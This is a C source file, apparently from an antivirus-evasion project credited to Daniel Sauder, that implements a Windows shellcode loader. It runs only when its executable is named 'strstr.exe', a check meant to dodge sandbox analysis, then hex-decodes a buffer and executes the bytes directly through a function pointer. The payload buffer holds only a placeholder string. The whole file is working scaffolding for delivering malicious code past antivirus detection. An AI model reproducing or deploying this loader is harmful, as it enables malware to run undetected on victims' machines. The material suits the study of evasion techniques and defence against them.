/*
Author: Daniel Sauder
Filename: strstr.c
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
From an example from deepsec 2013
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    i+=2;
    j++;
  } while(i<size);

  return shellcode;
}


int main (int argc, char **argv)
{
	unsigned char *shellcode;
	unsigned char buffer[]= "strstr.c";

 	if(strstr(argv[0], "strstr.exe") > 0)
	{
		int size = sizeof(buffer);

		shellcode = decode_shellcode(buffer,shellcode,size);
		exec_shellcode(shellcode);
	}
}
